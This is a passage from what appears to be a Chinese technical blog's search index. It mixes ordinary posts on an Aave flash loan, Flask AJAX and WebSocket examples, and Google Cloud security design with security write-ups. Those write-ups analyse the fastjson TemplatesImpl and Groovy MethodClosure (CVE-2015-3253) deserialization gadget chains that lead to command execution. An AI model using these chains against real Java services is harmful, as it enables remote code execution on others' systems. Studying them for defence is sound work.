TemplatesImpl实例并调用其空参构造函数之后，会依次遍历JSONString中设置的属性和值，并按顺序执行set&#123;属性名&#125;／get&#123;属性名&#125;的方法，如果不存在对应该格式的方法(get之后的第一个字母大写跟叔姓名)，则直接对该对象对应的属性值进行赋值\n所以当fastjson发现在TemplatesImpl中找不到setBytecodes()/getBytecodes()方法时，会直接对TemplatesImpl中的_bytecodes属性强赋值，而不会去调用代码里面定义的setTransletBytecodes()/getTransletBytecodes()\n这样来看，_name和_tfactory属性的setter/getter方法的格式是不对的，因此又被fastjson强赋值，但是当遍历到_outputProperties属性时，发现存在一个getOutputProperties()方法（然而这个方法并不是_outputProperties方法的get方法），fastjson会立即执行调用该方法\n（*上边这部分全靠参考大佬的文章才理解，不过不公开，在这说明下）*\n在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化\n0x02 代码分析getOutputProperties()\nnewTransformer()\n\ngetTransletInstance()\n\nAbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();\n对外部传入的java字节码生成的Class对象进行实例化，此处会调用该对象的构造函数，将触发自定义的代码\ngetTransletInstance()\n\nif (_bytecodes == null) &#123;          ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);          throw new TransformerConfigurationException(err.toString());      &#125;\n_bytecodes就是JSONString传入的字节码\nfor (int i = 0; i &lt; classCount; i++) &#123;                _class[i] = loader.defineClass(_bytecodes[i]);                final Class superClass = _class[i].getSuperclass();\n将_bytecodes（外部传入的字节码）还原成class对象，执行Runtime.getRuntime.exec()\n参考：http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/https://github.com/alibaba/fastjson/wiki/security_update_20170315\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"FlashLoan的实现过程","url":"/FlashLoan%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/","content":"闪电贷主要由借贷方和放贷方两部分构成，放贷方部署放贷合约，借贷方部署借贷合约，通过借贷合约去调用放贷合约实现，大致流程如下图。\n\n这里我们使用aave https://docs.aave.com/developers/guides/flash-loans 的实现来跟踪一下flashloan的过程，代码如下，aave这里没有使用标准的IERC3156实现，但是只需要将POOL.flashLoanSimple带入flashLoan、executeOperation带入onFlashLoan即可，其它流程基本一致。\n// SPDX-License-Identifier: MITpragma solidity 0.8.10;import &quot;https://github.com/aave/aave-v3-core/blob/master/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol&quot;;import &quot;https://github.com/aave/aave-v3-core/blob/master/contracts/interfaces/IPoolAddressesProvider.sol&quot;;import &quot;https://github.com/aave/aave-v3-core/blob/master/contracts/dependencies/openzeppelin/contracts/IERC20.sol&quot;;contract SimpleFlashLoan is FlashLoanSimpleReceiverBase &#123;    address payable owner;    constructor(address _addressProvider)        FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_addressProvider))    &#123;    &#125;    function fn_RequestFlashLoan(address _token, uint256 _amount) public &#123;        address receiverAddress = address(this);        address asset = _token;        uint256 amount = _amount;        bytes memory params = &quot;&quot;;        uint16 referralCode = 0;        POOL.flashLoanSimple(            receiverAddress,            asset,            amount,            params,            referralCode        );    &#125;    /**        This function is called after your contract has received the flash loaned amount     */    function  executeOperation(        address asset,        uint256 amount,        uint256 premium,        address initiator,        bytes calldata params    )  external override returns (bool) &#123;                //Logic goes here                uint256 totalAmount = amount + premium;        IERC20(asset).approve(address(POOL), totalAmount);        return true;    &#125;    receive() external payable &#123;&#125;&#125;\n\n首先部署在Remix上部署合约，这里用的是Polygon Munbai的测试环境，所以在文档https://docs.aave.com/developers/deployed-contracts/v3-testnet-addresses 中找到aave对应的测试合约地址0xeb7A892BB04A8f836bDEeBbf60897A7Af1Bf5d7F作为初始参数传入部署合约\n\n从上述的合约代码中可以看到，fn_RequestFlashLoan的入参分别是放贷地址以及借贷数量，同理，在aave的文档中找到usdc的金库地址0xe9DcE89B076BA6107Bb64EF30678efec11939234作为入参传入，发起借贷\n\n在一切顺利的情况下，fn_RequestFlashLoan中调用POOL.flashLoanSimple发起借贷，在POOL.flashLoanSimple中放款并回调executeOperation\n\n回调到借贷合约的executeOperation中后，执行预定的套利逻辑等一系列操作，然后返回状态通知executeFlashLoanSimple进行判断是否还款。\n参考：https://github.com/quiknode-labs/qn-guide-examples/tree/main/ethereum/aave-flash-loan\n","categories":["开发"],"tags":["BlockChain"]},{"title":"Flask前后端数据交互的几种常见方式","url":"/Flask%E5%89%8D%E5%90%8E%E7%AB%AF%E6%95%B0%E6%8D%AE%E4%BA%A4%E4%BA%92%E7%9A%84%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%96%B9%E5%BC%8F/","content":"前后端数据交互\njquery ajaxPost方式\n\n获取input value的几种方式：\n$(&quot; #name &quot;).val()$(&quot; input[ name=&#x27;name&#x27; ] &quot;).val()$(&quot; input[ type=&#x27;text&#x27; ] &quot;).val()$(&quot; input[ type=&#x27;text&#x27; ]&quot;).attr(&quot;value&quot;)、、、\n\n\n\n坑1：如果没有$(‘#submit’).click(function()动作的话，就只能获取input的预设value，如果没有预设则返回空\n&lt;body&gt;&lt;p&gt;jquery ajax&lt;/p&gt;&lt;form id=&quot;form1&quot;&gt;    &lt;input type=&quot;text&quot; id=&quot;name&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;Submit form&quot; id=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot;&gt;    $(&#x27;#submit&#x27;).click(function()&#123;        var data=&#123;&#125;        data[&#x27;name&#x27;] = $(&#x27;#name&#x27;).val();        $.ajax(&#123;            type: &#x27;POST&#x27;,            url: &quot;/trans1&quot;,            data: JSON.stringify(data),            contentType: &#x27;application/json; charset=UTF-8&#x27;,            dataType: &#x27;json&#x27;,            success: function(data) &#123;                alert(data)            &#125;,            error: function(xhr, type) &#123;            &#125;        &#125;);    &#125;);&lt;/script&gt;&lt;/body&gt;\n坑2:获取json数据可使用get_json()方法\n@app.route(&#x27;/trans1&#x27;, methods=[&#x27;post&#x27;])def trans1():    name = request.get_json(&#x27;name&#x27;)    print(name[&#x27;name&#x27;])    return jsonify(name[&#x27;name&#x27;] + &#x27;233333&#x27;)\n\n\n另一种写法\n坑3:input 的类型只能为button不能为submit只能为button,否则点击button会执行表单action,不会走jquery异步\n&lt;script type=&quot;text/javascript&quot;&gt;    $(&#x27;#submit&#x27;).click(function()&#123;        var data=&#123;&#125;        data[&#x27;name&#x27;] = $(&#x27;#name&#x27;).val();        var url = &quot;/trans1&quot;;        $.post(url,JSON.stringify(data),function(data)&#123;alert(data)&#125;,&#x27;json&#x27;);    &#125;);&lt;/script&gt;\n\nFlask WTF表单\nfrom flask_wtf import Formfrom wtforms import StringField,SubmitFieldfrom wtforms.validators import DataRequiredclass TestForm(Form):    name = StringField(&#x27;name&#x27;, validators=[DataRequired()])    submit = SubmitField(label=&#x27;submit&#x27;)@app.route(&#x27;/wtform&#x27;, methods=[&#x27;get&#x27;,&#x27;post&#x27;])def wtform():    form = TestForm()    name = form.name.data    print(name)    return render_template(&#x27;wtform.html&#x27;, form=form, name=name)\n\n坑4: &#123;&#123;form.hidden_tag()&#125;&#125;是flask防止csrf的机制，在config.py里配置SECRET_KEY = &#39;************&#39;，在view.py中引入app.config.from_pyfile(&#39;config.py&#39;)\n&lt;body&gt;&lt;form action=&quot;&#123;&#123; url_for(&#x27;wtform&#x27;) &#125;&#125;&quot; method=&quot;post&quot;&gt;    &#123;&#123;form.hidden_tag()&#125;&#125;    &lt;p&gt;        &#123;&#123;form.name&#125;&#125;&lt;br&gt;        &#123;&#123; form.submit &#125;&#125;    &lt;/p&gt;    &lt;p&gt;Hello, &#123;&#123; name &#125;&#125;&lt;/p&gt;&lt;/form&gt;&lt;/body&gt;\n\n\nXMLHttpRequestPost\n\n&lt;html&gt;  &lt;head&gt;    &lt;title&gt;Practice AJAX&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;      function do_ajax() &#123;        var req = new XMLHttpRequest();        var result = document.getElementById(&#x27;result&#x27;);        req.onreadystatechange = function()        &#123;          if(this.readyState == 4 &amp;&amp; this.status == 200) &#123;            result.innerHTML = this.responseText;          &#125; else &#123;            result.innerHTML = &quot;...&quot;;          &#125;        &#125;        req.open(&#x27;POST&#x27;, &#x27;/xmlhttp&#x27;, true);        req.setRequestHeader(&#x27;content-type&#x27;, &#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;);        req.send(&quot;name=&quot; + document.getElementById(&#x27;name&#x27;).value);      &#125;    &lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;form action=&quot;index&quot; method=&quot;post&quot;&gt;      &lt;label&gt;Name:&lt;input type=&quot;text&quot; id=&quot;name&quot; value=&quot;&quot; /&gt;&lt;/label&gt;      &lt;button type=&quot;button&quot; id=&quot;btn-post&quot; onclick=&quot;do_ajax();&quot;&gt;Click&lt;/button&gt;      &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;\n@app.route(&#x27;/xmlhttp&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def xmlhttp():    if request.method == &#x27;POST&#x27;:        name = request.form[&#x27;name&#x27;]        return &#x27;hello&#x27; + name    return render_template(&#x27;XMLHttpRequest.html&#x27;)\n\n\n\nWebSocket（Flask-Socketio）\n&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Flask-SocketIO Test&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;    &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/socket.io/1.5.1/socket.io.min.js&quot;&gt;&lt;/script&gt;    &lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot;&gt;    $(document).ready(function() &#123;        var socket = io.connect();        socket.on(&#x27;connect&#x27;, function() &#123;            socket.emit(&#x27;connect_event&#x27;, &#123;data: &#x27;connected!&#x27;&#125;);        &#125;)        socket.on(&#x27;server_response&#x27;, function(msg) &#123;            $(&#x27;#log&#x27;).append(&#x27;&lt;br&gt;&#x27; + $(&#x27;&lt;div/&gt;&#x27;).text(&#x27;Received #&#x27; + &#x27;: &#x27; + msg.data).html());        &#125;);        $(&#x27;form#emit&#x27;).submit(function(event) &#123;                socket.emit(&#x27;client_event&#x27;, &#123;data: $(&#x27;#emit_data&#x27;).val()&#125;);                return false;            &#125;);    &#125;);    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;WebSokect&lt;/h2&gt;    &lt;form id=&quot;emit&quot; method=&quot;POST&quot; action=&#x27;#&#x27;&gt;        &lt;input type=&quot;text&quot; name=&quot;emit_data&quot; id=&quot;emit_data&quot; placeholder=&quot;Message&quot;&gt;        &lt;input type=&quot;submit&quot; value=&quot;Echo&quot;&gt;    &lt;/form&gt;    &lt;div id=&#x27;log&#x27;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n\n#!/usr/bin/env pythonfrom flask import Flask, render_template, session, requestfrom flask_socketio import SocketIO, emitapp = Flask(__name__)app.config.from_pyfile(&#x27;config.py&#x27;)socketio = SocketIO(app)@app.route(&#x27;/&#x27;)def index():    return render_template(&#x27;websocket.html&#x27;)@socketio.on(&#x27;client_event&#x27;)def client_msg(msg):    emit(&#x27;server_response&#x27;, &#123;&#x27;data&#x27;: msg[&#x27;data&#x27;]&#125;)@socketio.on(&#x27;connect_event&#x27;)def connected_msg(msg):    emit(&#x27;server_response&#x27;, &#123;&#x27;data&#x27;: msg[&#x27;data&#x27;]&#125;)if __name__ == &#x27;__main__&#x27;:    socketio.run(app, host=&#x27;0.0.0.0&#x27;)\n参考\n源码\n","categories":["开发"],"tags":["dev"]},{"title":"Google云基础架构安全设计学习","url":"/Google%E4%BA%91%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1%E5%AD%A6%E4%B9%A0/","content":"一、责任共担模型和基础架构安全云提供商始终负责底层网络和基础架构，并且客户始终负责其访问政策和数据。\n\nGoogle 基础架构安全层详细参考：https://mp.weixin.qq.com/s/RJn5O5Gh-PJyt-1K2ivM8A (从位于底层的硬件基础架构安全性开始，到位于顶层的运营安全性。)\n\n二、安全的底层基础架构1. 安全启动栈和机器身份标识服务器利用以下技术确保启动正确的软件栈，启动链的硬件信任根如下：\n•    The Titan hardware chip\n•    A lockable firmware chip\n•    A microcontroller running our own security code\n\n通过自动化任务维护服务安全基线：\n•    确保服务器运行其软件栈的最新版本（包括安全补丁）。\n•    检测和诊断硬件和软件问题。\n•    使用启动时验证和隐式证明确保机器和外围设备的完整性。\n•    确保只有运行指定软件和固件的机器才能访问使其可在生产网络中进行通信的凭据。\n•    当不再需要机器时，在服务中移除或重新分配机器。\n\n三、安全的服务部署集群编排服务（Borg）控制直接在基础架构上运行的服务。\n“零信任安全模型”：基础架构假定基础架构上运行的服务之间不存在任何信任。无论是位于网络内部还是外部，默认情况下不信任任何设备或用户。\nBeyondCorp 认为“用户信任应该取决于设备的上下文感知状态等特征，而不是连接到公司网络的权限”；BeyondProd 认为“服务信任应该取决于代码出处和服务身份等特征，而不是生产网络中的位置（例如 IP 地址或主机名身份）”。\n下图对比了传统基础架构安全性方面与云原生架构中的安全性方面。更多细节参考：https://cloud.google.com/docs/security/beyondprod?hl=zh-cn\n\n在开发云原生架构时的安全原则：\n•    在边缘保护网络，以便将工作负载与来自互联网的网络攻击和未经授权的流量隔离开来。虽然基于防火墙的方法不是云原生架构的新概念，但仍然是安全性的最佳做法。在云原生世界中，边界方法用于保护尽可能多的基础架构，使其避开来自互联网的未经授权的流量和潜在的攻击，例如基于卷的拒绝服务攻击。\n\n•    服务之间没有固有的相互信任，只有已知的、受信任的、明确授权的调用者才能使用服务。这样可以阻止攻击者使用不可信代码访问服务。如果某个服务受到破解，这一原则可阻止攻击者执行扩大其攻击范围的操作。这种“互不信任”的机制有助于限制危害的范围。\n\n•    运行具有已知出处的代码的受信任机器，以便服务身份只能使用经过授权的代码和配置，并且只能在经过验证的授权环境中运行。\n\n•    用于跨服务强制执行一致政策的关卡。例如，一个用于验证访问用户数据的请求的关卡，以确保服务的访问来自于获得授权的最终用户发出且经过验证的请求，并且管理员的访问需要提供正当的理由。\n\n•    简单、自动化、标准化的更改发布，以便相关人员轻松审核基础架构更改对安全性的影响，并且可以在几乎不影响生产环境的情况下发布安全补丁程序。\n\n•    在共享操作系统的工作负载之间进行隔离，使得某项服务在被破解的情况下也不会影响同一主机上运行的其他工作负载的安全性。这样可以限制潜在的破解“影响范围”。\n\n基础架构设计为多租户。\n1. 服务身份标识、完整性与隔离为了实现服务间通信，应用使用加密的身份验证和授权。身份验证和授权以管理员和服务可以理解的抽象级别和粒度提供强大的访问权限控制。\n服务不依赖内部网络分段或防火墙作为主要安全机制。\n在基础架构上运行的每个服务都具有关联的服务帐号身份标识。安全政策可确保客户端与预期服务器通信，并且服务器限制特定客户端可以访问的方法和数据。\n使用各种隔离和沙盒技术来保护服务免受同一机器上运行的其他服务的影响。这些技术包括 Linux 用户分离、基于语言（如 Sandboxed API）和基于内核的沙盒、容器应用内核（如 gVisor）和硬件虚拟化。为风险较高的工作负载使用更多的隔离层。\n为了提高安全性，敏感服务（例如集群编排服务和某些密钥管理服务）只在专用机器上运行。\n2. 服务间访问管理服务的所有者可以利用基础架构提供的访问管理功能来精确指定其服务可以与其他哪些服务进行通信。\n可以将服务配置为根据身份标识允许或拒绝访问。所有这些身份标识（机器、服务和员工）都位于基础架构维护的全局命名空间中。\n为管理这些身份标识，基础架构提供了一个工作流系统，其中包括批准链、日志记录和通知。\n基础架构还为服务提供用户、群组和成员资格管理的规范化服务，可以在必要时实现精细的自定义访问权限控制。\n3. 服务间通信的加密基础架构可确保网络上的 RPC 数据的机密性和完整性。\n所有 Google Cloud 虚拟网络流量均经过加密。基础架构服务之间的所有通信都经过身份验证，大多数服务间通信均已加密，这增加了一层额外的安全保护，即使网络被窃听或网络设备遭到破解，也能保护通信。\n基础架构可自动、高效地（借助硬件分流）为数据中心之间通过网络传输的基础架构 RPC 流量提供端到端加密。\n4. Google Workspace 中的最终用户数据访问管理基础架构提供了一项中央用户身份识别服务，该服务可以颁发上述最终用户权限票证。\n身份识别服务验证最终用户登录，然后向用户的设备颁发用户凭据，例如 Cookie 或 OAuth 令牌。从该设备发送到的基础架构的每个后续请求都必须提供该最终用户凭据。\n当某个服务收到最终用户凭据时，会将该凭据传递给身份识别服务进行验证。如果最终用户凭据通过验证，身份识别服务会返回一个短期有效的最终用户权限票证，该票证可用于与该用户的请求相关的 RPC。\n基础架构可提供服务身份、自动身份互验、服务间通信加密，并可执行服务所有者定义的访问政策。每项服务都有一个由服务所有者创建的服务配置。对于加密的服务间通信，自动双向身份验证使用调用方和被调用方身份标识。只有在访问规则配置允许的情况下才能进行通信。\n\n四、安全的数据使用/存储Google 安全策略的核心是身份验证、完整性和加密，对于静态数据和传输中的数据均适用。\nGoogle 采用多种安全措施来确保传输过程中数据的真实性、完整性和私密性。\n•    身份验证：会验证数据源、人员或过程以及目标位置。\n•    完整性：确保您发送的数据会原封不动地到达目的地。\n•    加密：使数据在传输过程中无法识别，以保持其私密性。\n\n加密可用于保护三种状态的数据：\n•    静态加密通过加密存储的数据，防止数据受到系统入侵或数据渗漏的危害。\n•    传输加密：当数据在网站与云服务商之间或在两个服务之间移动时，如果通信遭到拦截，则可保护数据。\n•    使用中加密：通过加密处理中的数据（例如机密计算），保护内存中的数据免遭入侵或数据渗漏。\n\n1. 静态加密Google 的基础架构提供各种存储服务和分布式文件系统（例如 Spanner 和 Colossus）以及一个中央密钥管理服务。\nGoogle 的应用使用存储基础架构访问物理存储。默认情况下，存储基础架构会在用户数据写入物理存储空间之前加密所有用户数据。使用高级加密标准 (AES) 算法对静态存储的数据进行加密。\n基础架构在应用层或存储基础架构层执行加密。加密可使基础架构将其自身与底层存储上的潜在威胁（例如恶意磁盘固件）隔离开来。\n\nCloud Storage 加密机制的具体运作方式：\n•    会将数据分割为多个子文件块进行存储；每个块的大小可以达到数个 GB。每个块使用单独的加密密钥在存储层级进行加密，两个块不会共用同一个加密密钥。\n•    如果数据块发生更新，系统会使用新密钥对其进行加密，而不是重复使用现有密钥。\n•    每个数据块都有一个唯一标识符。访问控制列表 (ACL) 确保每个块只能由已获授权的角色使用 Google 服务进行解密，并且授权角色仅会在解密那一刻获得访问权限。\n•    每个块都分布在 Google 的存储系统中，并以加密形式进行复制，以便于备份和灾难恢复。\n\n\n除了存储系统级加密外，大多数情况下数据还会在存储设备级加密。\nGoogle 的备份系统可确保数据在整个备份过程中保持加密状态。备份系统还使用专属的 DEK 对每个备份文件进行独立加密。\n\n\n用于对块中的数据进行加密的密钥称为 DEK（数据加密密钥）。由于 Google 的密钥很多，且需要提供低延迟、高可用性的服务，因此这些密钥都存储在用其加密的数据附近。DEK 本身又使用 KEK（密钥加密密钥）进行加密（也称为“封装”）。每项 Google Cloud 服务都有一个或多个 KEK。这些 KEK 集中存储在 Google 的 KMS 中，这是一个专为存储密钥而构建的存储区。只需少量 KEK（少于 DEK 的数量）并使用集中式密钥管理服务，就能轻松管理整个 Google 中的数据存储和加密，同时还可以集中跟踪和控制对数据的访问。系统会将每位 Google Cloud 客户的所有非共享资源拆分为多个数据块，并使用客户专属的密钥进行加密。即使是同一位客户所拥有的同一部分数据，保护其各块的 DEK 也各不相同。 更多细节：https://cloud.google.com/docs/security/encryption/default-encryption?hl=zh-cn#key_management\n\n\nGoogle 的 KMS 受到名为“KMS 主密钥”的根密钥保护，该密钥会封装 KMS 中的所有 KEK。它本身存储在另一个名为“Root KMS”的 KMS 中。Root KMS 也有自己的根密钥，称为“根 KMS 主密钥”。\n•    对数据进行分块并使用 DEK 进行加密。\n•    DEK 使用 KEK 进行加密。\n•    KEK 存储在 KMS 中。\n•    KMS 在全球数据中心的多台机器上运行。\n•    KMS 密钥使用 KMS 主密钥进行封装，而 KMS 主密钥存储在 Root KMS 中。\n•    Root KMS 中的密钥数量远少于 KMS 中的数量，并且仅在每个数据中心内的专用机器上运行。\n•    Root KMS 密钥使用根 KMS 主密钥进行封装，后者存储在根 KMS 主密钥分发服务器中。\n•    根 KMS 主密钥分发服务器是一个点对点基础架构，在全球各地专用机器的 RAM 中并发运行；每个分发服务器实例都会从其他正在运行的实例获取其密钥材料。\n•    如果所有分发服务器实例都关闭（全球性关闭），有存储在（不同的）安全硬件中的主密钥，这些安全硬件存放在有限的几个 Google 地点的（实体）保险箱中。\n\n\n除了基础架构进行的加密以外，Google Cloud 和 Google Workspace 还提供密钥管理服务。\n高可用性、低延迟、密钥全球访问在每个层级都至关重要；只有具备这些特性，才能在整个 Google 范围内使用 KMS。\n2.数据删除客户发出删除请求时，客户数据删除操作就会开始。通常，删除请求会指向特定资源、Google Cloud 项目或客户的 Google 帐号。删除请求的处理方式可能会有所不同，具体取决于客户请求的范围。\n数据删除流程通常是从将具体数据标记为“已安排删除”开始，而不是真正的删除数据。借助此方法，可以恢复无意间删除的数据，例如由客户发起的删除、bug 导致的删除或内部流程错误导致的删除。数据标记为“已安排删除”后，系统会根据特定于服务的政策来删除数据。\n当最终用户删除其帐号时，基础架构会通知处理最终用户数据的服务该帐号已被删除。然后，这些服务便会安排删除与被删除的最终用户帐号相关联的数据。此功能使最终用户能够控制自己的数据。\n\n删除流程细节参考：https://cloud.google.com/docs/security/deletion?hl=zh-cn#deletion_timeline\n3.保护使用中的数据/传输加密机密计算通过在加密隔离中执行计算来保护正在使用的数据，并在多租户云环境中维护工作负载的机密性。\n这种类型的加密隔离环境有助于防止在使用应用或数据时对应用和数据进行未经授权的访问或修改。\n可信执行环境还可增强管理敏感数据和受监管数据的组织的安全保障。\nGoogle 使用各种加密方法（包括默认方法和用户可配置的方法）加密传输中的数据。使用的加密类型取决于 OSI 层、服务类型和基础架构的物理组件。\n实现细节参考：https://cloud.google.com/docs/security/encryption-in-transit?hl=zh-cn#how_google_helps_the_internet_encrypt_data_in_transit\n下图展示了 Google Cloud 为第 3、4 和 7 层配置的可选和默认保护措施，以及第 3 层和第 4 层的默认保护措施和各种选项。\n\n\n4.Cloud KMS通过 Cloud KMS，Google 可专注于提供可扩缩、可靠且高性能的解决方案，在使用方便的平台上提供最广泛的可控制选项。\nCloud KMS 的设计有五大重点：\n•    客户控制。借助 Cloud KMS，可以管理软件和硬件加密密钥，也可以提供自己的密钥。\n•    访问权限控制和监控。借助 Cloud KMS，可以分别管理各个密钥的权限，并监控这些密钥的使用方式。\n•    区域性。Cloud KMS 提供开箱即用的区域化功能。该服务配置为仅在所选的 Google Cloud 区域中创建、存储和处理软件密钥。\n•    耐用性。Cloud KMS 符合 Google Cloud 的最高耐用性标准。为了帮助防止数据损坏并验证数据能否成功解密，Cloud KMS 会定期扫描并备份所有密钥材料和元数据。\n•    安全性。Cloud KMS 提供强大的保护功能，以防密钥遭到未经授权的访问，并且已与 Identity and Access Management (IAM) 和 Cloud Audit Logs 控件完全集成。\n\nCloud KMS白皮书和实现细节参考：https://cloud.google.com/docs/security/key-management-deep-dive?hl=zh-cn\n\n4. 对上传到 Cloud Storage 的文档进行自动恶意软件扫描流水线中的步骤：\n•    将文件上传到 Cloud Storage。\n•    上传事件会自动触发恶意软件扫描服务。\n•    恶意软件扫描工具服务会扫描上传的文档是否包含恶意软件。\n•    如果文档受感染，则服务会将其移到隔离的存储分区；否则，该文档会被移到另一个存储分区以存放未受感染的已扫描文档。\n\n\n5.数据丢失导致的泄漏享受公有云基础架构带来的灵活性、成本节约和功能时还需要提高警惕，并采用新方法保护数据免遭外泄。\n细节参考：https://cloud.google.com/docs/security/data-loss-prevention/preventing-data-exfiltration?hl=zh-cn\n•    通过数据分区最小化数据外泄事件的“爆炸半径”。\n•    在系统管理员工作流程中创建冗余和批准以加强问责制。\n•    使用精细配置的权限并仅将敏感数据的访问权限授予有相应工作职能需要的员工。\n•    使用日志记录提高组织中数据访问和移动的透明度。\n•    使用联网规则、identity and access management (IAM) 以及堡垒主机限制和监控组织中的机器的入站和出站。\n•    创建数据流的正常基准（例如可访问或传输的数据量）和用于比较异常行为的访问的地理位置。\n\n五、安全的互联网通信服务间通信的安全性不依赖于网络安全。但是，将基础架构从互联网隔离到专用 IP 地址空间。只将部分机器直接暴露给外部互联网流量，从而可以实现额外的保护，例如防御拒绝服务 (DoS) 攻击。\n1. Google Front End 服务当某个服务需要在互联网上可用时，它可向名为 Google Front End (GFE) 的基础架构服务注册。\n2. DoS防护当光纤骨干网向其中一个数据中心传送外部连接时，该连接会经过多层硬件和软件负载均衡器。这些负载均衡器会将有关入站流量的信息报告给在基础架构上运行的中央 DoS 服务。当中央 DoS 服务检测到 DoS 攻击时，该服务可以配置负载均衡器，以降低或限制与攻击相关的流量。\n3. 用户身份验证在 DoS 防护之后，安全通信的下一层防御来自中央身份识别服务。\n用户登录时，他们可以使用第二重身份验证，例如动态密码或防钓鱼安全密钥（例如 Titan 安全密钥）。\n相关技术细节参考：https://cloud.google.com/docs/authentication?hl=zh-cnhttps://cloud.google.com/docs/authentication/use-cases?hl=zh-cn\n六、安全运营1.安全的软件开发源代码控制保护机制和双方审核流程安全库和安全框架自动化安全扫描工具人工安全审核漏洞奖励计划安全问题研究(P0)\n2.源代码保护源代码存储在具有内置源完整性和治理的代码库中，可以在其中审核服务的当前版本和过去版本。\n基础架构要求服务的二进制文件基于经过审核、登记和测试的特定源代码构建。\nBinary Authorization for Borg (BAB) 是部署服务时进行的内部强制执行检查。供应链完整性可确保处理数据的服务的底层代码和二进制文件得到验证，并且通过证明测试。\n•    确保 Google 上部署的生产软件和配置经过审核和授权，尤其是在代码可以访问用户数据时。\n•    确保代码和配置部署满足特定的最低标准。\n•    防止内部人员或攻击者恶意修改源代码，并实现从服务回溯到其源代码的取证跟踪。\n\n实现细节参看：https://cloud.google.com/docs/security/binary-authorization-for-borg?hl=zh-cn\n如果怀疑任何凭据已遭到泄露，必须立即采取措施来限制其 Google Cloud 帐号的影响。确保用户的SOC 拥有快速响应可疑凭据泄露事件所需的策略方案、工具和访问权限。\n将您的凭据与源代码分开管理和存储。不小心将凭据和源代码都推送到 GitHub 等源代码管理站点这种情况极其常见，这会使您的凭据容易遭到攻击。使用 Secret Manager 和 Hashicorp Vault 等密文管理解决方案来存储密文，定期进行轮替，并应用最小权限。\n3.确保员工设备及凭据的安全实施保护措施，使员工的设备和凭据免遭破解。强制使用与 U2F 兼容的安全密钥来取代动态密码双重身份验证。\n监控员工用于运行基础架构的客户端设备。\n使用零信任安全性来保护员工对资源的访问。\n4. 降低来自内部人员的风险限制并主动监控拥有基础架构管理员权限的员工的活动。\nGoogle 员工对最终用户信息的访问情况可通过底层基础架构钩子进行记录。安全团队会监控访问模式并调查异常事件。\n5.威胁监控Google 的威胁分析小组会监控威胁发起者及其策略和技术的演变。\n6.入侵检测使用复杂的数据处理流水线来集成各个设备上基于主机的信号、来自基础架构中各个监控点的基于网络的信号，以及来自基础架构服务的信号。构建于这些流水线之上的规则和机器智能会向运营安全工程师发出潜在突发事件警告。\n7.应急响应每个数据突发事件都具有特异性，数据突发事件响应流程的目标是保护客户的数据，尽快恢复正常服务，并满足监管和合同合规要求。 Google 的突发事件响应计划的流程如下：\n\n七、支持合规性要求Google Cloud 会定期接受安全性、隐私权和合规控制措施方面的独立验证，并接收认证、证明和审核报告以证明合规。\n","categories":["云安全"],"tags":["Cloud"]},{"title":"Groovy Deserialization(groovy.util.Expando)CVE-2015-3253","url":"/Groovy%20Deserialization(groovy.util.Expando)CVE-2015-3253/","content":"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3253\n影响版本（1.7.0~2.4.3）\n调用链分析MethodClosure\npublic class MethodClosure extends Closure &#123;    private String method;    public MethodClosure(Object owner, String method) &#123;        super(owner);        this.method = method;        Class clazz = owner.getClass() == Class.class ? (Class)owner : owner.getClass();        this.maximumNumberOfParameters = 0;        this.parameterTypes = new Class[0];        List&lt;MetaMethod&gt; methods = InvokerHelper.getMetaClass(clazz).respondsTo(owner, method);        Iterator i$ = methods.iterator();        while(i$.hasNext()) &#123;            MetaMethod m = (MetaMethod)i$.next();            if (m.getParameterTypes().length &gt; this.maximumNumberOfParameters) &#123;                Class[] pt = m.getNativeParameterTypes();                this.maximumNumberOfParameters = pt.length;                this.parameterTypes = pt;            &#125;        &#125;    &#125;    public String getMethod() &#123;        return this.method;    &#125;    protected Object doCall(Object arguments) &#123;        return InvokerHelper.invokeMethod(this.getOwner(), this.method, arguments);    &#125;\ndoCall()作用应该是执行构件好的对象（this.getOwner()）的方法（this.method）\ninvokeMethod\npublic static Object invokeMethod(Object object, String methodName, Object arguments) &#123;    if (object == null) &#123;        object = NullObject.getNullObject();    &#125;    if (object instanceof Class) &#123;        Class theClass = (Class)object;        MetaClass metaClass = metaRegistry.getMetaClass(theClass);        return metaClass.invokeStaticMethod(object, methodName, asArray(arguments));    &#125; else &#123;        return !(object instanceof GroovyObject) ? invokePojoMethod(object, methodName, arguments) : invokePogoMethod(object, methodName, arguments);    &#125;&#125;\n调用指定对象的指定方法所以可以利用这个方法来执行命令\nMethodClosure mc = new MethodClosure(new 